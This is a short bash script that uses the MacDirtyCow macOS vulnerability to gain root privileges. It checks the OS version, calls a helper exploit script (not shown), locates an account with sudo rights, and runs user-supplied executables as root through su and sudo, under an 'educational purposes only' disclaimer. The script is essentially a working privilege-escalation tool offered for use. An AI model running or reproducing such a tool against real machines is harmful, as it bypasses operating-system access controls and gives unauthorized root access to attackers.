#!/bin/bash

# This script will use the MacDirtyCow exploit to elevate executables on a Mac.
# 
# This script is for educational purposes only. I am not responsible for any
# damage caused by this script.

# Check if at least one parameter is provided
if [ $# -lt 1 ]; then
	echo "usage: $0 [executable ...]"
	exit 1
fi

# Check compatibility
compat=$(./helpers/compat.command)
if [ $compat -eq 0 ]; then
	echo "Sorry, your macOS version ($(sw_vers -productVersion)) is not compatible with this program."
	echo "Check the README.md to see supported versions."
	exit 1
fi

# Run exploit
./helpers/exploit.command

# Find a sudoer
user=$(./helpers/find_sudoer.command)

# Run the executables with root access
while [ $# -gt 0 ]; do
	current_argument="$1"
	su - $user -c "sudo $current_argument"
	shift
done